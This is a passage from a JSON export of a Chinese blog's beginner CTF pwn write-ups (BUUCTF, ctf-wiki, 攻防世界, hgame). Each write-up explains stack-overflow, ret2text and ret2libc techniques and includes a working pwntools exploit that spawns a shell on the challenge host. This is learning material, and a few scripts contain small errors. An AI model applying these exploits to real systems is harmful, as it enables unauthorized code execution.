30574)system_addr = 000000000401176payload = b &#x27; a &#x27; * 0x18 + p64(system_addr)p.sendline(payload)p.interactive() 0x05好奇怪为什么官方的WP可以直接反汇编成正常的函数？搜了一下好像可以手动添加标签,这篇文章教了一下这么回复库函数名，但是看不懂…… 0x06得到shell后发现并没有办法显示出flag，问题就在之前的那个close(1)因为汇编代码中有这样一句 mov edi, 1 所以认为close()括号里的参数时1这时候需要使用命令让shell能够正常回显 exec 1&gt;&amp;0 累死了，终于拿到flag","categories":[{"name":"入门集训wp","slug":"入门集训wp","permalink":"http://lmarch2.github.com/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.com/tags/ctf/"},{"name":"hgame","slug":"hgame","permalink":"http://lmarch2.github.com/tags/hgame/"}]},{"title":"week2 T5","slug":"week2-T5","date":"2023-01-13T13:03:38.000Z","updated":"2024-01-31T02:34:16.034Z","comments":true,"path":"posts/46e9d6ae/","link":"","permalink":"http://lmarch2.github.com/posts/46e9d6ae/","excerpt":"T5 cgpwn2 2023-01-09WP攻防世界 pwn题","text":"T5 cgpwn2 2023-01-09WP攻防世界 pwn题 0x01file checksec——32-bit，开启NX保护 0x02IDA中打开window发现这题又是一个找不到&#x2F;bin&#x2F;sh的但是在pwn函数中还是找到了system函数的然后我们来看hello函数的反汇编代码好像有点复杂，简单来说就是前面先定义了一堆变量，然后条件判断先不看了先看后面的首先要求我们输入一个名字，通过fgets函数完成，并且从键盘最多只能读取32h个字符到name然后再通过gets函数从键盘读取字符到s区域，没有输入字符数量的限制其中name是bss段的一个大小为34的区域，s是长度为0x26个字节的区域于是我们可以向name区域输入&#x2F;bin&#x2F;sh,然后让这个地址作为system函数的参数，而s则用来进行栈溢出，并让溢出的返回地址为system函数的地址 0x03exp 1234567891011from pwn import *p = remote(’61.147.171.105‘，51582)target = 0x804855Abinsh = 0x804A080payload = b&#x27;a&#x27; * 0x26 +b &#x27;bbbb&#x27; #覆盖s和ebp的数据 + p32(target) + p32(binsh)#返回gets函数的地址和参数a = r.recvuntil(&#x27;e\\n&#x27;)p.sendline(&#x27;/bin/sh&#x27;)#向fget函数发送字符串a = r.recvuntil(&#x27;:\\n&#x27;)#等待接受到括号内的信息后再运行下面的内容p.sendline(payload)#发送payloadp.interactive() 好像不要a &#x3D; r.recvuntil(‘e\\n’)，a &#x3D; r.recvuntil(‘:\\n’)也可以……","categories":[{"name":"入门集训wp","slug":"入门集训wp","permalink":"http://lmarch2.github.com/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.com/tags/ctf/"},{"name":"攻防世界","slug":"攻防世界","permalink":"http://lmarch2.github.com/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"}]},{"title":"week2 T4","slug":"week2-T4","date":"2023-01-13T13:03:33.000Z","updated":"2024-01-31T02:34:07.946Z","comments":true,"path":"posts/31eee638/","link":"","permalink":"http://lmarch2.github.com/posts/31eee638/","excerpt":"T4 ret2libc2 2023-01-09WPctf-wiki 基础rop","text":"T4 ret2libc2 2023-01-09WPctf-wiki 基础rop 0x01file checksec——32-bit，开启NX 0x02拖入IDA看看危险函数和ret2libc1相同都是gets不同的是这次没有&#x2F;bin&#x2F;sh给我们用了我还找了好久来着……但是system函数还是有的那我们先找出system的地址0x08048490接下来我们得想办法弄出个&#x2F;bin&#x2F;sh来由于程序已经开启NX保护，我们无法直接写入栈所以思考在bss段写入字符串 说实话，这个地方第一次看真的怎么都想不到……然后接下来我又不会了，怎么找到bss…….博客上好多方法看得我头晕目眩，又还不会用ROPgadget……最后我直接在IDA里快捷键G了一下跳到了.bss段发现里面有个buff2(设计好了的吧？)，我们可以用gets函数写入&#x2F;bin&#x2F;sh到buff2去找gets的地址 得到0x8048460 0x03用gdb暴力求出偏移量终于可以写exp了 0x041234567891011from pwn import *sh = process(&#x27;./ret2libc2&#x27;)gets_plt = 0x08048460system_plt = 0x08048490buf2 = 0x804a080payload = flat( [b&#x27;a&#x27; * 112, gets_plt, system_plt, buf2,buf2])#先覆盖溢出，返回gets函数的地址，#接着返回执行system函数的地址，然后传入gets函数参数buf2的地址,system函数的参数buf2sh.sendline(payload)sh.sendline(&#x27;/bin/sh&#x27;)sh.interactive() 这篇文章和这篇博客挺不错的还有这篇 0x05ctf-wiki的exp是 1234567891011121314##!/usr/bin/env pythonfrom pwn import *sh = process(&#x27;./ret2libc2&#x27;)gets_plt = 0x08048460system_plt = 0x08048490pop_ebx = 0x0804843dbuf2 = 0x804a080payload = flat( [&#x27;a&#x27; * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])sh.sendline(payload)sh.sendline(&#x27;/bin/sh&#x27;)sh.interactive() [‘a’ * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2]为啥还需要一个 pop_ebx呢？好像看到有博客说是为了堆栈平衡其实就是用了两个gadget在调用gets函数后，把参数buf2给pop掉，这样返回地址就变成了system，就会返回到system","categories":[{"name":"入门集训wp","slug":"入门集训wp","permalink":"http://lmarch2.github.com/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.com/tags/ctf/"},{"name":"ctf-wiki","slug":"ctf-wiki","permalink":"http://lmarch2.github.com/tags/ctf-wiki/"}]},{"title":"week2 T3","slug":"week2-T3","date":"2023-01-13T13:03:27.000Z","updated":"2024-01-31T02:34:01.184Z","comments":true,"path":"posts/af8a739b/","link":"","permalink":"http://lmarch2.github.com/posts/af8a739b/","excerpt":"T3 ret2libc1 2023-01-09WPctf-wiki 基础rop","text":"T3 ret2libc1 2023-01-09WPctf-wiki 基础rop 0x00 ctf-wiki中的原理解释ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“&#x2F;bin&#x2F;sh”)，故而此时我们需要知道 system 函数的地址。0x01file checksec——32-bit，开启NX 0x02IDA查看源码，应该是gets函数的栈溢出shift+f12看到有&#x2F;bin&#x2F;sh字符串,找地址为0x08048720并且在secure函数中有system函数，双击进去查看得到 system 函数地址为08048460 0x03gdb调试找偏移量可能都是ctf-wiki里面的题的原因吧这里甚至连偏移量都和前面ret2text的一样 0x04我们要直接返回执行system 函数，exp可以这样写 1234567from pwn import *sh = process(&#x27;./ret2libc1&#x27;)binsh_addr = 0x8048720system_addr = 0x08048460payload = flat([b&#x27;a&#x27; * 112, system_addr,b &#x27;b&#x27; * 4, binsh_addr])sh.sendline(payload)sh.interactive() 这里的四个b是system函数的返回地址，这里只是起到让结构合法的作用，具体是什么不重要，因为我们只需要调用system就行了我这个flat（）还查了好久是什么意思……实际上就是把几个字符串拼接在一起 0x05 questions也可以直接返回system函数压参的地址0x0804860A(也就是 call _system处的地址)而不返回函数的 plt 处，但是32位一般返回plt处地址后先跟函数返回地址（虚拟的）再接参数一个plt表和got表的教学文章","categories":[{"name":"入门集训wp","slug":"入门集训wp","permalink":"http://lmarch2.github.com/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.com/tags/ctf/"},{"name":"ctf-wiki","slug":"ctf-wiki","permalink":"http://lmarch2.github.com/tags/ctf-wiki/"}]},{"title":"week2 T2","slug":"week2-T2","date":"2023-01-13T13:03:21.000Z","updated":"2024-01-31T02:33:54.877Z","comments":true,"path":"posts/d88d430d/","link":"","permalink":"http://lmarch2.github.com/posts/d88d430d/","excerpt":"T2 ret2text(上题的另一种解法) 2023-01-09WP网上看到另一种暴力解法感觉很不错于是自己做过了一遍0x01与0x02跟上题相同","text":"T2 ret2text(上题的另一种解法) 2023-01-09WP网上看到另一种暴力解法感觉很不错于是自己做过了一遍0x01与0x02跟上题相同 0x03大体思路就是输入一堆测试数据然后调试看在那个输入点报错了，这个输入点就是刚好溢出的那个点，然后计算偏移量即可先用cyclic生成有序字符队列运行并输入生成的字符串得到invalid addres 0x62616164用cyclic -l查找偏移量 0x04写exp 123456from pwn import *io = process(&#x27;./ret2text&#x27;)success_addr = 0x0804863Apayload = b&#x27;a&#x27; * 112 + p32(success_addr)io.sendline(payload)io.interactive()","categories":[{"name":"入门集训wp","slug":"入门集训wp","permalink":"http://lmarch2.github.com/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.com/tags/ctf/"},{"name":"ctf-wiki","slug":"ctf-wiki","permalink":"http://lmarch2.github.com/tags/ctf-wiki/"}]},{"title":"week2 T1","slug":"week2-T1","date":"2023-01-13T13:03:09.000Z","updated":"2024-01-31T02:33:45.495Z","comments":true,"path":"posts/418412b7/","link":"","permalink":"http://lmarch2.github.com/posts/418412b7/","excerpt":"T1 ret2text 2023-01-09WPctf-wiki基础rop","text":"T1 ret2text 2023-01-09WPctf-wiki基础rop 0x01file checksec——32-bit， 开启NX 0x02IDA查看代码，可以看出main函数中有gets函数，存在栈溢出漏洞发现还有有一个secure函数调用了system(“&#x2F;bin&#x2F;sh”)双击字符串Ctrl+X，记下”&#x2F;bin&#x2F;sh”的地址0x0804863A0x0804863A就是需要返回的地址 0x03用gdb调试在调用gets函数的地址处0x080486AE设置断点r 运行如下其中ebp为0xffffcff8,esp为0xffffcf70,那么s为[esp+0x1c]即0xffffcf8c，相对于ebp的偏移是0x6c，相对于返回地址的偏移是0x6c+4 0x04写exp 12345from pwn import *sh = process(&#x27;./ret2text&#x27;)target = 0x804863ash.sendline(b&#x27;A&#x27; * (0x6c+4) + p32(target))sh.interactive() 0x05疑问：我有一点不明白的是为什么IDA中看到的s相对于ebp的偏移是64h，而gdb调试出来的是0x6c+4网上看到有一个只用IDA就成功地算出了偏移量，但对于文章里的解释并不是很理解只能说有时候IDA还是与gdb的有出入，不过还是以gdb调试的为准","categories":[{"name":"入门集训wp","slug":"入门集训wp","permalink":"http://lmarch2.github.com/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.com/tags/ctf/"},{"name":"ctf-wiki","slug":"ctf-wiki","permalink":"http://lmarch2.github.com/tags/ctf-wiki/"}]},{"title":"week1 T5","slug":"week1-T5","date":"2023-01-13T13:02:53.000Z","updated":"2024-01-31T02:33:35.742Z","comments":true,"path":"posts/545c7940/","link":"","permalink":"http://lmarch2.github.com/posts/545c7940/","excerpt":"T5 pwn1_sctf_2016 2023-01-09WPBUUCTF pwn第五题","text":"T5 pwn1_sctf_2016 2023-01-09WPBUUCTF pwn第五题 0x01file checksec——32-bit,开启NX 0x02IDA中shift+f12可以找到有个cat flag.txt可以利用这个函数来输出flag查看调用它的函数并记下它的地址0x8048F0D继续寻找能够溢出的函数，在main函数中的vuln函数里有fget()函数但是fget函数限制了输入长度为32，好像并不能构成栈溢出于是我就蒙了，fget后面的伪代码又不是看得很懂……查了许多大概理解了是后面的replace函数将一个字节的i换成了三个字节的you这样一来我们只需要输入20个‘I’，replace后就会变成60个字节的‘you’,这样就能填满长度为0x3Ch的spayload再覆盖掉ebp再加上get_flag函数的地址就可以了最后看大佬博客半懂半不懂地写了个exp（这篇博客感觉算是比较详细的，它甚至是直接分析汇编语言） 0x03exp 123456from pwn import *p = remote(&#x27;node4.buuoj.cn&#x27;, 28105)flag_addre = 0x08048F0Dpayload = b&#x27;I&#x27;*0x14+b&#x27;aaaa&#x27;+p32(flag_addre)p.sendline(payload)p.interactive() 0x04还是不是很懂到底是怎么看出来是把i换成you的还有就是这个replace函数的参数列表中那个v4代表的是什么并没有在v4这里写入i或者you呀，这猜都不好猜是把i换成you了直接点进去看replace的源码好像又不科学，根本看不懂……补充：C++的伪代码就是比较难看，不能只看IDA了，要结合gdb调试去猜i换成you的替换","categories":[{"name":"入门集训wp","slug":"入门集训wp","permalink":"http://lmarch2.github.com/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.com/tags/ctf/"},{"name":"BUUCTF","slug":"BUUCTF","permalink":"http://lmarch2.github.com/tags/BUUCTF/"}]},{"title":"week1 T4","slug":"week1-T4","date":"2023-01-13T13:02:24.000Z","updated":"2024-01-31T02:33:29.735Z","comments":true,"path":"posts/235b49d6/","link":"","permalink":"http://lmarch2.github.com/posts/235b49d6/","excerpt":"T4 ciscn_2019_n_1 2023-01-08WPBUUCTF pwn第四题","text":"T4 ciscn_2019_n_1 2023-01-08WPBUUCTF pwn第四题 0x01先file，chekcsec——64-bit，开启NX 0x02IDA中main函数没啥有用的，看到还有一个fun函数点进去看发现有个gets函数，可能存在栈溢出，同时发现if ( v2 &#x3D;&#x3D; 11.28125 )时调用system函数，所以想到输入来使v2的值等于11.28125但是gets读入的时v1而不是v2，所以又想到让v1溢出，使溢出的值为11.28125并让它成为v2的值于是进去查看v1v2的地址计算得长度为44h 0x03exp 12345from pwn import *p=remote(&#x27;node4.buuoj.cn&#x27;,25907)payload=b&quot;a&quot;*44+p64(0x41348000)#0x41348000是11.28125的十六进制数p.sendline(payload)p.interactive() 直接写11.28125好像没用……网上看到一篇博客是直接从IDA中找十六进制数的pwn得flag还有一种方法就是直接覆盖v1v2，让返回地址指向调用system函数的地址0x4006BE这就让我有一些疑惑：就这一题来说，开启了NX有没有让题目难度增加呢？","categories":[{"name":"入门集训wp","slug":"入门集训wp","permalink":"http://lmarch2.github.com/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.com/tags/ctf/"},{"name":"BUUCTF","slug":"BUUCTF","permalink":"http://lmarch2.github.com/tags/BUUCTF/"}]},{"title":"week1 T3","slug":"week1-T3","date":"2023-01-13T13:02:17.000Z","updated":"2024-01-31T02:33:22.595Z","comments":true,"path":"posts/bd3fdc75/","link":"","permalink":"http://lmarch2.github.com/posts/bd3fdc75/","excerpt":"T3 warmup_csaw_2016 2023-01-06WPBUUCTF pwn第三题考点：栈溢出，与上题类似","text":"T3 warmup_csaw_2016 2023-01-06WPBUUCTF pwn第三题考点：栈溢出，与上题类似 0x01 checksec下载文件，没有开启任何保护（看大佬博客里说按经验这种情况一般就是栈溢出了） 0x02 IDAf5反汇编，main函数里有一个gets()函数看到返回一个gets()函数，可利用栈溢出但是这个两个参数的gets函数没有看懂……那个write和sprintf函数也没看懂……shift+f12调出string window 查看字符串，虽然没有&#x2F;bin&#x2F;sh，但是找到了一个cat flag.txt，应该可以利用双击cat flag.txt进去看看，X一下发现是在sub_40060D函数里，反汇编再看一下发现我们想要的system（）就在这，若能调用它的话就能直接命令抓取flag了呀接下来就是记下sub_40060D函数的地址0x40060D,并将其作为溢出的返回地址（也可以记把偏移量压入寄存器那条汇编指令处的地址0x40011）又因为要gets的v5的大小为0x40h，所以与返回地址的距离是0x40+8（rbp的长度） 0x03 exp写出exploit 123456from pwn import *p = remote(&#x27;node4.buuoj.cn&#x27;,25916)payload=&#x27;a&#x27;*(0x40+8)+p64(0x400611)p.sendline(payload)p.interactive() 得到flag 0x04 thinking这题跟上一题一样，都是栈溢出，都是将某个后门函数的地址覆盖掉返回地址一开始没反应过来cat flag.txt可以直接用，还在那找&#x2F;bin&#x2F;sh,还是对信息不太敏感……不过对栈的相关知识的学习还是让人感觉有收获的","categories":[{"name":"入门集训wp","slug":"入门集训wp","permalink":"http://lmarch2.github.com/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.com/tags/ctf/"},{"name":"BUUCTF","slug":"BUUCTF","permalink":"http://lmarch2.github.com/tags/BUUCTF/"}]},{"title":"week1 T2","slug":"week1-T2","date":"2023-01-13T13:01:55.000Z","updated":"2024-01-31T02:33:15.626Z","comments":true,"path":"posts/ca38ece3/","link":"","permalink":"http://lmarch2.github.com/posts/ca38ece3/","excerpt":"T2 rip 2023-01-04WPBUUCTF pwn第二题考点：简单的栈溢出","text":"T2 rip 2023-01-04WPBUUCTF pwn第二题考点：简单的栈溢出 0x01 checksec查看保护机制啥都没开，非常nice 0x02 IDAfile后是64位，扔到IDA里打开string window,发现有&#x2F;bin&#x2F;sh，双击-》点击command,ctrl+X跳到fun函数里Function window直接找也行….直接f5大法main函数里好像没啥用看到char了一个s数组还有get函数，栈溢出无疑了fun函数里有system函数，想到把fun函数的地址压进栈的return address里使fun函数得以执行于是找出fun函数中调用system的地址0x40118A有了地址，现在需要知道的是s的长度，在IDA中可以找到距离rbp的距离是0Fh，也就是s的内存空间为15字节,当然了，除此之外，还需要8字节的数据将rbp填满，才能让数据溢过Local Variables 和 Caller’s rsp，溢出进入Return Address 0x03 expvim pwn1.py#pwn1.py from pwn import * p = remote(&quot;node4 .buuoj.cn&quot;,25026) payload = b&#39;a&#39; * (0xf+8) + p64(0x40118A) p.sendline(payload) p.interactive() 一开始没加b’’然后报错TypeError: can only concatenate str (not “bytes”) to str……执行脚本得到flag 0x04 补充一些知识IDA栈帧视窗详细说明：这篇文章这篇文章举了一个例子详细说明","categories":[{"name":"入门集训wp","slug":"入门集训wp","permalink":"http://lmarch2.github.com/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.com/tags/ctf/"},{"name":"BUUCTF","slug":"BUUCTF","permalink":"http://lmarch2.github.com/tags/BUUCTF/"}]},{"title":"week1 T1","slug":"week1-T1","date":"2023-01-13T12:15:14.000Z","updated":"2024-01-31T02:33:10.366Z","comments":true,"path":"posts/5331bd59/","link":"","permalink":"http://lmarch2.github.com/posts/5331bd59/","excerpt":"T1 test_your_nc 2023-01-03WPBUUCTF pwn第一题","text":"T1 test_your_nc 2023-01-03WPBUUCTF pwn第一题 一、用checksec检测文件保护机制下载文件，checksec得知已开启NX保护（奇怪的是checksec没有给出文件位数，后来还是file了一下得到是64位） 二、打开IDA将文件扔到IDA中，按下shift+f12,打开string window，发现&#x2F;bin&#x2F;sh双击&#x2F;bin&#x2F;sh，点击command，交叉引用快捷键X，发现地址在main函数里按下f5确定main函数就是一个简单地调用了&#x2F;bin&#x2F;sh的system函数(其实感觉前两步就这题来说没必要……但是看一篇博客说拿到文件先checksec一下再IDA一下于是想试一下……) 三、结合题目提示可知直接nc（这个地方一开始报错，仔细一看发现ctrl cv过来的端口那里还有一个：得把冒号去掉……）ls列出文件目录发现flag，用cat（concatenate，命令用于连接文件并打印到标准输出设备上）抓取flag得","categories":[{"name":"入门集训wp","slug":"入门集训wp","permalink":"http://lmarch2.github.com/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.com/tags/ctf/"},{"name":"BUUCTF","slug":"BUUCTF","permalink":"http://lmarch2.github.com/tags/BUUCTF/"}]}],"categories":[{"name":"HASHTEAM'wp","slug":"HASHTEAM-wp","permalink":"http://lmarch2.github.com/categories/HASHTEAM-wp/"},{"name":"wp","slug":"wp","permalink":"http://lmarch2.github.com/categories/wp/"},{"name":"tools and tricks","slug":"tools-and-tricks","permalink":"http://lmarch2.github.com/categories/tools-and-tricks/"},{"name":"collections","slug":"collections","permalink":"http://lmarch2.github.com/categories/collections/"},{"name":"notes","slug":"notes","permalink":"http://lmarch2.github.com/categories/notes/"},{"name":"入门集训wp","slug":"入门集训wp","permalink":"http://lmarch2.github.com/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.com/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"http://lmarch2.github.com/tags/pwn/"},{"name":"C++","slug":"C","permalink":"http://lmarch2.github.com/tags/C/"},{"name":"BUUCTF","slug":"BUUCTF","permalink":"http://lmarch2.github.com/tags/BUUCTF/"},{"name":"ctf-wiki","slug":"ctf-wiki","permalink":"http://lmarch2.github.com/tags/ctf-wiki/"},{"name":"攻防世界","slug":"攻防世界","permalink":"http://lmarch2.github.com/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"},{"name":"hgame","slug":"hgame","permalink":"http://lmarch2.github.com/tags/hgame/"}]}